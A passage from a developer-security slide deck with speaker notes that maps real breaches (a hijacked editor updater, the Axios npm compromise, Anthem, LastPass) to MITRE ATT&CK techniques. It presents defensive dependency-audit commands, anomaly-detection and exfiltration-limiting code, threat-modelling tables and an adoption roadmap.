2. Targeted users served trojanized `update.exe`
3. Legitimate Bitdefender binary side-loaded malicious `log.dll`
4. Shellcode decrypted → **Chrysalis** backdoor installed
5. Cobalt Strike C2 established over HTTP

</div>
<div>

### 🎯 ATT&CK Techniques
- **T1195.002** — Update infrastructure hijacked
- **T1036** — Masquerading as legitimate updater
- **T1574.002** — DLL side-loading (`log.dll`)
- **T1140** — Shellcode deobfuscation/decryption
- **T1071.001** — C2 via HTTP/HTTPS
- 💡 Fix: v8.8.9 enforced **signature verification**

</div>
</div>

<!-- The source code was clean. The GitHub repo was clean. The problem was the update delivery channel — attacker-controlled infrastructure intercepted update traffic and served trojanized NSIS installers to selected targets. Public project disclosure put the compromise at the hosting/update-infrastructure level, not the source repository. Developer tools are privileged trust anchors: if your editor's updater is hijacked, the attacker inherits the trust of your normal daily workflow. The lesson: signed source does not mean safe delivery channel. -->

---

## Case Study: Axios NPM Compromise (2026)

<div class="columns">
<div>

### 📦 The 3-Hour Window
1. **Mar 31**: Maintainer account compromised via Remote Access Trojan (RAT) malware
2. `axios@1.14.1` + `axios@0.30.4` published
3. Hidden dep: `plain-crypto-js@4.2.1`
4. `postinstall` downloads **cross-platform RAT**
5. Targets secrets: cloud keys, SSH, API tokens

</div>
<div>

### 🎯 ATT&CK Techniques
- **T1195.001** — Compromised npm package
- **T1078** — Hijacked maintainer credentials
- **T1059** — RAT via postinstall script
- **T1552** — Credential harvesting
- 🇰🇵 Attributed to **Sapphire Sleet** (DPRK)
- 💥 **100M+ weekly downloads** exposed

</div>
</div>

<!-- The Axios attack in March 2026 hit the most popular HTTP client in JavaScript — over 100 million weekly downloads. Attackers compromised a maintainer's account using social engineering and RAT malware, then published two poisoned versions. The hidden dependency ran a postinstall script that downloaded a platform-specific RAT targeting secrets on Windows, macOS, and Linux. It was live for only 3 hours but potentially exposed millions of CI/CD pipelines and dev environments. The attribution to North Korea's Sapphire Sleet group shows how nation-states target the open source supply chain. -->

---

<!-- _class: parchment -->

## One Does Not Simply Patch Production

<div class="columns">
<div>

![w:100%](./img/memes/one-does-not-simply.jpg)

</div>
<div>

> "It's just one CVE."

| The council says | The keep actually needs |
|---|---|
| Patch the gate | Know which gates exist |
| Restart the service | Prove the caravan still runs |
| Close the ticket | Watch for sappers already inside |

**ATT&CK lens:** T1190 — Exploit Public-Facing Application

</div>
</div>

<!-- Speaker note: The joke is that patching is not a button. For developers, the real work is asset inventory, safe rollout, compensating controls, and post-patch detection. -->
---

<style scoped>
pre { font-size: 0.48em; line-height: 1.15; margin: 0.2em 0; }
</style>

## Dependency Security Toolkit (T1195.001 Prevention)

```bash
# Audit & verify — run in CI/CD
npm audit --audit-level high              # NPM vulnerability scan
pip-audit && bandit -r .                  # Python vuln scan + SAST
dotnet list package --vulnerable --include-transitive  # .NET vuln scan
```

```bash
# Lock files — pin exact versions + hashes
npm ci --only=production                  # Install from lockfile exactly
pip install --require-hashes -r req.txt   # Verify hashes on install
dotnet restore --locked-mode              # Fail if lockfile doesn't match
```

```bash
# SBOMs — know what's in your software
syft . -o spdx-json > sbom.json           # Generate SBOM with Syft
npm sbom --sbom-format cyclonedx           # NPM native SBOM support
grype sbom:./sbom.json                     # Scan SBOM against CVE databases
```

<!-- Three layers of defense: First, audit every dependency for known vulnerabilities in CI. Second, use lockfiles with cryptographic hashes so no one can swap a package without detection. Third, generate SBOMs — a complete inventory of every component — so when a new CVE drops you can instantly answer "are we affected?" Run all three as gates in your CI/CD pipeline. -->

---

## Supply Chain Security Flow

![center](./img/attack-chain-supply.drawio.png)

<!-- This is your supply chain security pipeline. Every dependency goes through integrity checks and vulnerability scanning before it's installed. Even after installation, monitoring continues — because vulnerabilities can be discovered in packages you already use. Automation is key — make this a gate in your CI/CD pipeline. -->

---

<!-- _class: section -->

# Collection & Exfiltration

<!-- This is the endgame for many attacks. The attacker has gotten in, escalated privileges, and moved laterally. Now they want the data. How do they collect it, and how do they get it out without being noticed? The treasure is in the strongroom; the trick is getting it out without anyone noticing the wagons leaving. -->

---

## How Attackers Steal Your Data

| Technique ID | Name | Description |
|--------------|------|-------------|
| T1213 | Data from Information Repositories | Bulk data access |
| T1567 | Exfiltration Over Web Service | Cloud storage uploads |
| T1020 | Automated Exfiltration | Scripted data theft |

<!-- T1213 is bulk data harvesting — think SELECT * FROM customers. T1567 uses legitimate cloud services like Dropbox or Google Drive to exfiltrate data, making it hard to distinguish from normal traffic. T1020 automates the process with scripts that systematically extract and transfer data. -->

---

## Real World: The Exfiltration Playbook

<div class="columns">
<div>

### 🏥 Anthem Breach (2015)
- **T1213** — Queried 78.8M patient records
- **T1020** — Automated extraction over weeks
- **T1071** — Exfil disguised as normal HTTP
- 💥 Largest healthcare breach in US history

</div>
<div>

### 🔑 LastPass Breach (2022)
- **T1528** — Stole cloud storage access tokens
- **T1213** — Accessed encrypted vault backups
- **T1567** — Exfiltrated via cloud storage API
- 💥 25M+ users' vault data stolen
- 💡 Attacker targeted **a developer's home PC**

</div>
</div>

<!-- Exfiltration is often the quietest phase because attackers want to avoid detection. Anthem's attackers queried 78.8 million records over weeks, blending with normal database traffic. LastPass is especially relevant for developers — the attacker compromised a DevOps engineer's personal machine to steal cloud storage credentials, then used legitimate cloud APIs to download vault backups. The data was encrypted, but the attacker had the keys. Both cases show why anomaly detection on data access patterns is critical — you need to catch the unusual query before 78 million records walk out the door. -->

---

## Data Access Anomaly Detection

```python
# T1213 Detection: Unusual data access patterns
class DataAccessMonitor:
    def __init__(self):
        self.user_baselines = {}
    def check_access_pattern(self, user_id, query, context):
        baseline = self.get_user_baseline(user_id)
        current = {
            'records_accessed': query.estimated_rows,
            'tables_accessed': len(query.tables),
            'data_sensitivity': self.classify_sensitivity(query.tables)
        }
        score = self.calculate_anomaly_score(baseline, current)
        if score > 0.8:
            self.log_technique('T1213', {
                'user': user_id, 'score': score, 'query': query.sanitized_sql
            })
            return self.require_step_up_auth(user_id)
        return True
    def calculate_anomaly_score(self, baseline, current):
        scores = [min(abs((current[m] - baseline[m]['mean']) /
                  baseline[m]['std']) / 3.0, 1.0)
                  for m in ['records_accessed', 'tables_accessed']]
        return max(scores)
```

<!-- This is behavioral analytics in action. We baseline each user's normal data access patterns — how many records they typically access, which tables, what time of day. When someone suddenly accesses 10x their normal volume or touches sensitive tables they've never queried before, the anomaly score spikes and we trigger step-up authentication. -->

---

## API Rate Limiting with Exfil Detection

```javascript
// T1567/T1020 Prevention: Exfiltration-aware rate limiting
class ExfiltrationDetector {
    constructor() { this.tracking = new Map(); }
    async checkDataTransfer(userId, requestSize, responseSize) {
        const now = Date.now();
        const windowMs = 60 * 60 * 1000; // 1 hour
        if (!this.tracking.has(userId)) this.tracking.set(userId, []);
        const transfers = this.tracking.get(userId)
            .filter(t => now - t.timestamp < windowMs);
        transfers.push({ timestamp: now, responseSize });
        this.tracking.set(userId, transfers);
        // Bulk transfer analysis
        const total = transfers.reduce((sum, t) => sum + t.responseSize, 0);
        if (total > 100 * 1024 * 1024) { // 100MB in 1 hour
            await this.logSecurityEvent('T1567', {
                userId, totalTransferred: total,
                requestCount: transfers.length, timeWindow: '1h'
            });
            return false; // Block
        }
        return true;
    }
}
```

<!-- Traditional rate limiting counts requests. Exfiltration-aware rate limiting counts bytes. An attacker might make only 10 API calls, but if each returns 10MB of data, that's 100MB of exfiltration in minutes. By tracking cumulative transfer volume per user per time window, we can detect and block bulk data theft even at low request rates. -->

---

## Data Flow Monitoring

![center h:480](./img/data-flow-monitoring.drawio.png)

<!-- Multiple checkpoints in the data flow. Authorization happens first, then anomaly detection checks the pattern, then bulk transfer detection checks the volume, and finally rate limiting checks the frequency. Any checkpoint can block the request and alert the security team. Layered defense for data protection. -->

---

<!-- _class: section -->

# Practical Implementation

<!-- Now let's talk about how to actually bring all of this into your development workflow. Theory is great, but what do you do on Monday morning? This is where the castle map becomes the maintenance plan: which walls do we inspect, instrument, and reinforce first? -->

---

## ATT&CK-Informed Threat Modeling

![center h:480](./img/threat-modeling-loop.drawio.png)

<!-- This is your threat modeling loop. For every feature, ask: what ATT&CK techniques could target this? Then design detections, implement them, and test. The loop is continuous — as new techniques are added to ATT&CK, revisit your features. This is a shift from reactive patching to proactive defense design. -->

---

## Map Features to Techniques

| Application Feature | ATT&CK Techniques | Risk Level |
|---------------------|------------------|------------|
| User Login | T1078 Valid Accounts, T1110 Brute Force, T1566 Phishing | High |
| Password Reset | T1566 Phishing, T1078 Valid Accounts | High |
| Session Management | T1185 Browser Session Hijacking, T1098 Account Manipulation | High |
| File Upload | T1505.003 Web Shell, T1190 Exploit Public-Facing App | High |
| API Endpoints | T1087 Account Discovery, T1046 Network Scanning | Medium |
| Data Export | T1567 Exfil Over Web, T1020 Automated Exfil | High |
| Logging System | T1070 Indicator Removal, T1027 Obfuscation | Medium |
| Dependencies | T1195 Supply Chain, T1195.001 Compromise Dependencies | Medium |

<!-- This table is a cheat sheet. For every feature in your application, you can look up which ATT&CK techniques are relevant. User login maps to credential attacks. File upload maps to web shells. Data export maps to exfiltration. Use this as a starting point for your threat model — customize it for your specific application. -->

---

## Building Detection Into Code

### Key Patterns:

- **Behavioral Analytics**: Monitor user patterns vs baselines
- **Technique Logging**: Tag events with ATT&CK IDs for correlation
- **Adaptive Controls**: Risk-based authentication and authorization  
- **Honey Tokens**: Fake data/accounts to detect unauthorized access
- **Immutable Auditing**: Tamper-evident logging and monitoring

<!-- These are the five patterns we've seen throughout this talk. Behavioral analytics baseline normal behavior and flag anomalies. Technique logging uses ATT&CK IDs so your SIEM can correlate across systems. Adaptive controls increase security requirements when risk increases. Honey tokens are traps for attackers. Immutable auditing ensures your investigation data can't be tampered with. -->

---
<!-- _class: parchment -->

## Detection Maturity: A Brief Evolution

![bg right:55% fit](./img/memes/galaxy-brain.jpg)

**ATT&CK lens:** T1071 — Application Layer Protocol

<!-- This is the galaxy-brain format. The joke teaches the maturity curve: raw logs are useful, alerts are better, technique correlation gives shared language, and behavioral analytics catches attacker movement that simple rules miss. The captain who notices the new guard limping the wrong way — that's the top brain. Most teams live in the second or third panel; the goal of an ATT&CK-aware detection strategy is to push the median up one rung at a time. -->
---

<!-- _class: parchment -->

## Defense in Depth Architecture

![w:900px center](./img/defense-in-depth.drawio.png)


<!-- Defense in depth means every layer has its own security controls. The outer bailey blocks noisy T1190 and T1110 attempts, the inner bailey limits stolen-key damage from T1078, the keep catches injection and business-logic abuse, and the strongroom protects secrets and data even after earlier walls fail. The point is not one perfect wall; it is forcing the attacker to beat independent controls at every layer while your detection has more chances to see them. -->

---

## OWASP + ATT&CK Integration

![w:1000px center](./img/owasp-attack-integration.drawio.png)

<!-- This is how OWASP and ATT&CK work together in practice. OWASP gives you secure coding practices, vulnerability testing, and security reviews. ATT&CK adds behavioral monitoring, technique correlation, and threat hunting. Together, you get: Secure by Design, Monitor by Behavior, and Respond by Intelligence. Your existing tools — SAST, SIEM, code reviews, pen tests — all have both an OWASP angle (find vulnerabilities) and an ATT&CK angle (detect technique patterns). Leverage what you already have. -->

---

## Implementation Roadmap

<div class="columns3">
<div>

### Phase 1: Foundation
- Map features to ATT&CK techniques
- Secure logging with technique IDs
- Basic behavioral analytics

</div>
<div>

### Phase 2: Detection
- Anomaly detection for high-risk techniques
- Automated response workflows
- SIEM integration

</div>
<div>

### Phase 3: Advanced
- Honey tokens and deception
- Threat intelligence correlation
- Security dashboards

</div>
</div>

<!-- Don't try to boil the ocean. Phase 1 is mapping and logging — understand what you're defending and make sure you can see what's happening. Phase 2 adds active detection and automated response. Phase 3 adds advanced capabilities like deception and threat intelligence. Each phase builds on the last. -->

---
<!-- _class: parchment -->

## Roll Initiative: When the Alert Is Real

![bg right fit](./img/memes/roll-initiative.png)


```text

SIEM:  T1071 beacon pattern from build agent
App:   unusual token use from impossible travel
API:   30x normal export volume
Team:  ...roll initiative
```

| First round | Action |
|---|---|
| Triage | Confirm signal and scope blast radius |
| Contain | Revoke token, isolate runner, stop export |
| Preserve | Snapshot logs before the scribe gets bribed |
| Recover | Patch path, rotate secrets, write detection |

**ATT&CK lens:** T1071 — Application Layer Protocol


<!-- This is the response handoff: detection only matters if the team knows the first moves. The practical lesson is to predefine containment and evidence-preservation actions for high-risk ATT&CK-tagged alerts. -->
---

## Team Adoption & Tooling

<div class="columns">
<div>

### Adoption Strategies
- **Training**: ATT&CK workshops for dev teams
- **Process**: Technique IDs in security requirements
- **Culture**: "Red team thinking" in design reviews
- **Metrics**: Track technique coverage rates
- **Collaboration**: Regular dev ↔ security syncs

</div>
<div>

### ATT&CK Navigator
- **Tool**: [attack-navigator](https://mitre-attack.github.io/attack-navigator/)
- Visualize technique coverage and gaps
- Color-code: 🟢 defended / 🟡 partial / 🔴 gap
- Communicate risk to stakeholders
- Plan security improvements

</div>
</div>

<!-- Security culture is as important as security code. Train your team on ATT&CK, include technique IDs in your Jira tickets, and encourage "red team thinking" in design reviews. The ATT&CK Navigator is a free tool for visualizing your coverage — a visual heat map of your security posture is worth a thousand bullet points. Ask: "If I were an attacker, how would I abuse this feature?" -->

---

## Start Small - Pick Your Top 3

### Recommendation for most applications:
1. **T1078 (Valid Accounts)** - Authentication monitoring
2. **T1185 (Session Hijacking)** - Session security  
3. **T1213 (Data Collection)** - Data access anomalies

### Why these first:
- **High impact** on most attack chains
- **Relatively easy** to implement
- **Immediate value** for detection
- **Foundation** for expanding coverage

<!-- Don't be overwhelmed by 200+ techniques. Start with these three: authentication monitoring catches credential abuse, session security prevents hijacking, and data access anomalies catch collection and exfiltration. These three techniques appear in almost every major breach. Master these, then expand. -->

---

<!-- _class: parchment -->

### How It Started vs How It's Going

![bg right fit](./img/memes/how-it-started.jpg)


| How it started 😎 | How it's going 😱 |
|---|---|
| `// TODO: add auth later` | `[CRITICAL] T1190 - SQLi in production` |
| `// TODO: rotate this API key` | `[CRITICAL] T1552 - API key on GitHub` |
| `// TODO: add rate limiting` | `[CRITICAL] T1110 - 50K login attempts/hr` |
| `// TODO: check dependencies` | `[CRITICAL] T1195 - Malicious dependency` |

> Every "TODO: fix later" is an attacker's "TODO: exploit now"

**ATT&CK lens:** T1190 — Exploit Public-Facing Application

<!-- This is a joke but also very real. Every security TODO in your backlog is a technique an attacker can exploit. The difference between the left and right columns is just time. ATT&CK helps you prioritize which TODOs to fix first based on real adversary behavior. Medieval engineers also thought one tall wall was enough, right up until someone found the servant's door. -->
---

## Key Takeaways

- ✅ **OWASP + ATT&CK = Complete Security** - Prevention + Detection
- ✅ **Think Like an Attacker** - Understand adversary behavior patterns
- ✅ **Build Detection Into Code** - Monitoring isn't just ops responsibility
- ✅ **Log ATT&CK Technique IDs** - Enable security team correlation
- ✅ **Use Behavioral Analytics** - Go beyond simple rule-based detection
- ✅ **Start Small, Iterate** - Pick 3 techniques and expand coverage

<!-- Wrapping up. Leave with a map of the gates, keys, tunnels, watchtowers, and strongrooms your code needs to defend. If you remember nothing else: OWASP and ATT&CK are complementary, not competing. Think like an attacker to build better defenses. Detection is a developer responsibility, not just ops. Tag your security events with ATT&CK IDs. Use behavioral analytics. And start with three techniques — don't try to cover everything at once. -->

---

<div class="columns">
<div>

## Links

- **[MITRE ATT&CK Framework](https://attack.mitre.org/)** - Main knowledge base
- **[ATT&CK Enterprise Matrix](https://attack.mitre.org/matrices/enterprise/)** - Technique matrix
- **[ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/)** - Coverage visualization
- **[OWASP Developer Guide](https://owasp.org/www-project-developer-guide/)** - Secure development
- **[D3FEND](https://d3fend.mitre.org/)** - Defensive countermeasures

</div>
<div>

## Chris Ayers

<i class="fa-brands fa-bluesky"></i> BlueSky: [@chris-ayers.com](https://bsky.app/profile/chris-ayers.com)
<i class="fa-brands fa-linkedin"></i> LinkedIn: - [chris\-l\-ayers](https://linkedin.com/in/chris-l-ayers/)
<i class="fa fa-window-maximize"></i> Blog: [https://chris-ayers\.com/](https://chris-ayers.com/)
<i class="fa-brands fa-github"></i> GitHub: [Codebytes](https://github.com/codebytes)
<i class="fa-brands fa-mastodon"></i> Mastodon: [@Chrisayers@hachyderm.io](https://hachyderm.io/@Chrisayers)
~~<i class="fa-brands fa-twitter"></i> Twitter: @Chris_L_Ayers~~

</div>
</div>

<!-- Here are resources to continue your journey. The ATT&CK framework site and Navigator are your primary tools. D3FEND is MITRE's companion project that maps defensive countermeasures to techniques. And please reach out — I love talking about this stuff. -->

---

# Questions?

![bg right](./img/owl.png)

<!-- Thank you! I'm happy to take questions. If we run out of time, catch me in the hallway or reach out on BlueSky or LinkedIn. -->

---

<div class="columns">
<div>

# Tell Me How I Did

- **What landed?** 
- **Where go deeper?** 
- **What to trim?** 

</div>
<div>

![w:380](./themes/techorama/mitre_attck_for_developers-qr-code.png)

</div>
</div>

<!-- Your feedback shapes the next chapter of this deck. Scan that scroll if you're willing to share what worked, what didn't, and where you'd like me to focus next time. -->
